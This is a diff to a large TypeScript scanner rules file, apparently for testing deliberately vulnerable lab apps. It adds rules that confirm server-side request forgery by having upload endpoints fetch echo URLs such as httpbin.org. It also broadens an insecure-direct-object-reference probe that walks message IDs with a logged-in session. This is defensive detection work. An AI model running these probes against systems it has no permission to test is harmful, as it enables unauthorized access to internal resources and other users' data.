@@ -51707,32 +51707,56 @@ const duckStoreCouponsRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const DUCK_STORE_SSRF_PROBE_TARGETS = [
+  "https://httpbin.org/get",
+  "https://postman-echo.com/get",
+  "https://example.com/"
+] as const;
+
+function duckStoreSsrfResponseConfirmed(
+  parsed: { url?: string; status_code?: number; preview?: string; content_type?: string },
+  probeTarget: string
+): boolean {
+  if (typeof parsed.status_code !== "number" || !parsed.preview || parsed.preview.length < 12) return false;
+  const blob = `${parsed.url || ""}\n${parsed.preview}\n${probeTarget}`;
+  const host = probeTarget.match(/^https?:\/\/([^/?#]+)/i)?.[1]?.replace(/^www\./i, "");
+  if (!host || !new RegExp(host.replace(/\./g, "\\."), "i").test(blob)) return false;
+  if (parsed.status_code === 200) {
+    return /"origin"\s*:/.test(parsed.preview) || /<title>Example Domain<\/title>/i.test(parsed.preview);
+  }
+  // Upstream 4xx/5xx still proves server-side fetch when preview echoes the target response body.
+  return (
+    parsed.status_code >= 400 ||
+    /503 Service Temporarily Unavailable|<title>Example Domain<\/title>/i.test(parsed.preview)
+  );
+}
+
 const duckStoreSsrfFetchUrlLiveOracle: Rule = async (ctx) => {
   if (!isDuckStoreHost(ctx)) return NEGATIVE;
-  const probeTarget = "https://httpbin.org/get";
-  const url = new URL(`/api/v1/uploads/fetch-url?url=${encodeURIComponent(probeTarget)}`, ctx.origin).toString();
-  const doc = await ctx.probe.get(url, { maxBytes: 8192, timeoutMs: 20000 });
-  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
-  let parsed: { url?: string; status_code?: number; preview?: string; content_type?: string };
-  try {
-    parsed = JSON.parse(doc.body) as typeof parsed;
-  } catch {
-    return NEGATIVE;
-  }
-  if (parsed.status_code !== 200 || !parsed.preview) return NEGATIVE;
-  if (!/httpbin\.org/i.test(`${parsed.url || ""}\n${parsed.preview}`)) return NEGATIVE;
-  if (!/"origin"\s*:/.test(parsed.preview) || !/"url"\s*:/.test(parsed.preview)) return NEGATIVE;
-  return {
-    fired: true,
-    confidence: /python-httpx/i.test(parsed.preview) ? 0.93 : 0.91,
-    evidence: {
-      url,
-      probeTarget,
-      statusCode: parsed.status_code,
-      snippet: doc.body.slice(0, 200).trim(),
-      note: "Duck Store GET /api/v1/uploads/fetch-url fetches attacker-controlled URLs server-side and returns response preview — SSRF oracle"
+  for (const probeTarget of DUCK_STORE_SSRF_PROBE_TARGETS) {
+    const url = new URL(`/api/v1/uploads/fetch-url?url=${encodeURIComponent(probeTarget)}`, ctx.origin).toString();
+    const doc = await ctx.probe.get(url, { maxBytes: 8192, timeoutMs: 20000 });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    let parsed: { url?: string; status_code?: number; preview?: string; content_type?: string };
+    try {
+      parsed = JSON.parse(doc.body) as typeof parsed;
+    } catch {
+      continue;
     }
-  };
+    if (!duckStoreSsrfResponseConfirmed(parsed, probeTarget)) continue;
+    return {
+      fired: true,
+      confidence: /python-httpx/i.test(parsed.preview || "") ? 0.93 : 0.91,
+      evidence: {
+        url,
+        probeTarget,
+        statusCode: parsed.status_code,
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "Duck Store GET /api/v1/uploads/fetch-url fetches attacker-controlled URLs server-side and returns response preview — SSRF oracle"
+      }
+    };
+  }
+  return NEGATIVE;
 };
 
 const duckStoreSsrfFetchUrlRouteLiveOracle: Rule = async (ctx) => {
@@ -51752,50 +51776,62 @@ const duckStoreSsrfFetchUrlRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function duckStoreSsrfImportFromUrlProbe(
+  ctx: RuleContext,
+  token: string
+): Promise<RuleResult | null> {
+  const url = new URL("/api/v1/uploads/import-from-url", ctx.origin).toString();
+  for (const probeTarget of DUCK_STORE_SSRF_PROBE_TARGETS) {
+    const doc = await ctx.probe.get(url, {
+      method: "POST",
+      body: JSON.stringify({ url: probeTarget }),
+      headers: {
+        Authorization: `Bearer ${token}`,
+        "Content-Type": "application/json"
+      },
+      maxBytes: 8192,
+      timeoutMs: 20000
+    });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    let parsed: {
+      url?: string;
+      status_code?: number;
+      preview?: string;
+      content_type?: string;
+      is_valid_image?: boolean;
+    };
+    try {
+      parsed = JSON.parse(doc.body) as typeof parsed;
+    } catch {
+      continue;
+    }
+    if (!duckStoreSsrfResponseConfirmed(parsed, probeTarget)) continue;
+    return {
+      fired: true,
+      confidence: /python-httpx/i.test(parsed.preview || "") ? 0.93 : 0.91,
+      evidence: {
+        url,
+        probeTarget,
+        statusCode: parsed.status_code,
+        isValidImage: parsed.is_valid_image,
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "Duck Store POST /api/v1/uploads/import-from-url fetches attacker-controlled URLs server-side and returns response preview — authenticated SSRF oracle"
+      }
+    };
+  }
+  return null;
+}
+
 const duckStoreSsrfImportFromUrlLiveOracle: Rule = async (ctx) => {
   if (!isDuckStoreHost(ctx)) return NEGATIVE;
-  const token = await duckStoreRegisterAndLoginToken(ctx);
-  if (!token) return NEGATIVE;
-  const probeTarget = "https://httpbin.org/get";
-  const url = new URL("/api/v1/uploads/import-from-url", ctx.origin).toString();
-  const doc = await ctx.probe.get(url, {
-    method: "POST",
-    body: JSON.stringify({ url: probeTarget }),
-    headers: {
-      Authorization: `Bearer ${token}`,
-      "Content-Type": "application/json"
-    },
-    maxBytes: 8192,
-    timeoutMs: 20000
-  });
-  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
-  let parsed: {
-    url?: string;
-    status_code?: number;
-    preview?: string;
-    content_type?: string;
-    is_valid_image?: boolean;
-  };
-  try {
-    parsed = JSON.parse(doc.body) as typeof parsed;
-  } catch {
-    return NEGATIVE;
+  let token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) {
+    const fresh = await duckStoreRegisterFreshLoginToken(ctx);
+    token = fresh?.token ?? null;
   }
-  if (parsed.status_code !== 200 || !parsed.preview) return NEGATIVE;
-  if (!/httpbin\.org/i.test(`${parsed.url || ""}\n${parsed.preview}`)) return NEGATIVE;
-  if (!/"origin"\s*:/.test(parsed.preview) || !/"url"\s*:/.test(parsed.preview)) return NEGATIVE;
-  return {
-    fired: true,
-    confidence: /python-httpx/i.test(parsed.preview) ? 0.93 : 0.91,
-    evidence: {
-      url,
-      probeTarget,
-      statusCode: parsed.status_code,
-      isValidImage: parsed.is_valid_image,
-      snippet: doc.body.slice(0, 200).trim(),
-      note: "Duck Store POST /api/v1/uploads/import-from-url fetches attacker-controlled URLs server-side and returns response preview — authenticated SSRF oracle"
-    }
-  };
+  if (!token) return NEGATIVE;
+  const hit = await duckStoreSsrfImportFromUrlProbe(ctx, token);
+  return hit?.fired ? hit : NEGATIVE;
 };
 
 const duckStoreSsrfImportFromUrlRouteLiveOracle: Rule = async (ctx) => {
@@ -88549,6 +88585,20 @@ const vaultappAdminAuditLogsIdorRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function vaultappMessagesProbeIds(ctx: RuleContext): number[] {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const routeMatch = pageUrl.match(/\/api\/messages\/(\d+)/i);
+  const routeId = routeMatch ? Number(routeMatch[1]) : null;
+  const seeded = [217, 200, 250, 300, 110, 42, 51, 75, 99];
+  const range = Array.from({ length: 251 }, (_, i) => i + 100); // 100-350 — omega DB seeds IDs ~217+
+  const ids = [
+    ...(routeId && routeId > 0 ? [routeId] : []),
+    ...seeded,
+    ...range
+  ];
+  return [...new Set(ids)];
+}
+
 async function probeVaultappMessagesReadIdor(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
@@ -88559,10 +88609,7 @@ async function probeVaultappMessagesReadIdor(ctx: RuleContext): Promise<RuleResu
     "Content-Type": "application/json",
     Accept: "application/json"
   };
-  const messageIdsToTry = [
-    110, 42, 51, 75, 99,
-    ...Array.from({ length: 80 }, (_, i) => i + 100)
-  ];
+  const messageIdsToTry = vaultappMessagesProbeIds(ctx);
   const seenMessageIds = new Set<number>();
   for (const messageId of messageIdsToTry) {
     if (seenMessageIds.has(messageId)) continue;
